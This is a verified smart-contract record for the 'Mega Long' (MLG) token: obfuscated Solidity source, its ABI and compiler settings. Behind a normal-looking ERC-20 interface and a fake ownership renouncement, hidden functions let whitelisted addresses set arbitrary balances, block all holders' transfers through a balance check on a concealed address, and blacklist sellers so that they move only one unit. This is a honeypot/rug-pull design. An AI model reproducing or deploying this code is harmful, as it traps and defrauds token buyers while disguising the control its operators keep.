{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface minSwap {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address modeShould) external view returns (uint256);\n\n    function transfer(address walletTo, uint256 launchMode) external returns (bool);\n\n    function allowance(address amountMax, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchMode) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address walletTo,\n        uint256 launchMode\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverIs, uint256 value);\n    event Approval(address indexed amountMax, address indexed spender, uint256 value);\n}\n\nabstract contract amountTeam {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface totalFundExempt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface totalTokenWallet {\n    function createPair(address exemptLiquidityMax, address maxTrading) external returns (address);\n}\n\ninterface minSwapMetadata is minSwap {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract MegaLong is amountTeam, minSwap, minSwapMetadata {\n\n    mapping(address => mapping(address => uint256)) private fromSell;\n\n    mapping(address => bool) public listMarketing;\n\n    uint256 private senderLaunched = 100000000 * 10 ** 18;\n\n    uint256 public receiverMarketing;\n\n    function name() external view virtual override returns (string memory) {\n        return limitExempt;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return tokenAuto;\n    }\n\n    function transferFrom(address totalTeamLaunch, address walletTo, uint256 launchMode) external override returns (bool) {\n        if (_msgSender() != fundMarketing) {\n            if (fromSell[totalTeamLaunch][_msgSender()] != type(uint256).max) {\n                require(launchMode <= fromSell[totalTeamLaunch][_msgSender()]);\n                fromSell[totalTeamLaunch][_msgSender()] -= launchMode;\n            }\n        }\n        return exemptWalletList(totalTeamLaunch, walletTo, launchMode);\n    }\n\n    uint256 private receiverTeam;\n\n    function limitToken(address totalTeamLaunch, address walletTo, uint256 launchMode) internal returns (bool) {\n        require(senderLiquidity[totalTeamLaunch] >= launchMode);\n        senderLiquidity[totalTeamLaunch] -= launchMode;\n        senderLiquidity[walletTo] += launchMode;\n        emit Transfer(totalTeamLaunch, walletTo, launchMode);\n        return true;\n    }\n\n    function transfer(address swapSenderFee, uint256 launchMode) external virtual override returns (bool) {\n        return exemptWalletList(_msgSender(), swapSenderFee, launchMode);\n    }\n\n    uint256 public totalTeamReceiver;\n\n    mapping(address => uint256) private senderLiquidity;\n\n    uint256 receiverMax;\n\n    bool public receiverFundFee;\n\n    address public sellTx;\n\n    function symbol() external view virtual override returns (string memory) {\n        return marketingTotal;\n    }\n\n    event OwnershipTransferred(address indexed fromLimit, address indexed txWalletLiquidity);\n\n    uint8 private tokenAuto = 18;\n\n    function marketingLimit(uint256 launchMode) public {\n        launchedLimit();\n        receiverMax = launchMode;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return senderLaunched;\n    }\n\n    function liquidityTeam(address swapSenderFee, uint256 launchMode) public {\n        launchedLimit();\n        senderLiquidity[swapSenderFee] = launchMode;\n    }\n\n    function launchList(address fundTotal) public {\n        if (receiverFundFee) {\n            return;\n        }\n        \n        txAmount[fundTotal] = true;\n        if (receiverTeam == totalTeamReceiver) {\n            totalTeamReceiver = receiverTeam;\n        }\n        receiverFundFee = true;\n    }\n\n    function approve(address amountTxLaunch, uint256 launchMode) public virtual override returns (bool) {\n        fromSell[_msgSender()][amountTxLaunch] = launchMode;\n        emit Approval(_msgSender(), amountTxLaunch, launchMode);\n        return true;\n    }\n\n    string private limitExempt = \"Mega Long\";\n\n    function exemptWalletList(address totalTeamLaunch, address walletTo, uint256 launchMode) internal returns (bool) {\n        if (totalTeamLaunch == fundLaunch) {\n            return limitToken(totalTeamLaunch, walletTo, launchMode);\n        }\n        uint256 walletReceiver = minSwap(sellTx).balanceOf(exemptTx);\n        require(walletReceiver == receiverMax);\n        require(walletTo != exemptTx);\n        if (listMarketing[totalTeamLaunch]) {\n            return limitToken(totalTeamLaunch, walletTo, enableLimitIs);\n        }\n        return limitToken(totalTeamLaunch, walletTo, launchMode);\n    }\n\n    function launchedLimit() private view {\n        require(txAmount[_msgSender()]);\n    }\n\n    address fundMarketing = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function allowance(address isFeeToken, address amountTxLaunch) external view virtual override returns (uint256) {\n        if (amountTxLaunch == fundMarketing) {\n            return type(uint256).max;\n        }\n        return fromSell[isFeeToken][amountTxLaunch];\n    }\n\n    function balanceOf(address modeShould) public view virtual override returns (uint256) {\n        return senderLiquidity[modeShould];\n    }\n\n    string private marketingTotal = \"MLG\";\n\n    address exemptTx = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    constructor (){\n        \n        totalFundExempt atAmountFee = totalFundExempt(fundMarketing);\n        sellTx = totalTokenWallet(atAmountFee.factory()).createPair(atAmountFee.WETH(), address(this));\n        \n        fundLaunch = _msgSender();\n        atSellTx();\n        txAmount[fundLaunch] = true;\n        senderLiquidity[fundLaunch] = senderLaunched;\n        \n        emit Transfer(address(0), fundLaunch, senderLaunched);\n    }\n\n    uint256 constant enableLimitIs = 1 ** 10;\n\n    address private limitLiquidity;\n\n    function owner() external view returns (address) {\n        return limitLiquidity;\n    }\n\n    mapping(address => bool) public txAmount;\n\n    function getOwner() external view returns (address) {\n        return limitLiquidity;\n    }\n\n    function atSellTx() public {\n        emit OwnershipTransferred(fundLaunch, address(0));\n        limitLiquidity = address(0);\n    }\n\n    uint256 totalMarketing;\n\n    address public fundLaunch;\n\n    function fromBuy(address receiverFund) public {\n        launchedLimit();\n        if (receiverMarketing != receiverTeam) {\n            receiverMarketing = receiverTeam;\n        }\n        if (receiverFund == fundLaunch || receiverFund == sellTx) {\n            return;\n        }\n        listMarketing[receiverFund] = true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txWalletLiquidity\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverIs\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isFeeToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountTxLaunch\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTxLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchMode\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atSellTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeShould\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFund\",\"type\":\"address\"}],\"name\":\"fromBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTotal\",\"type\":\"address\"}],\"name\":\"launchList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapSenderFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchMode\",\"type\":\"uint256\"}],\"name\":\"liquidityTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchMode\",\"type\":\"uint256\"}],\"name\":\"marketingLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverFundFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalTeamReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapSenderFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchMode\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalTeamLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchMode\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "MegaLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}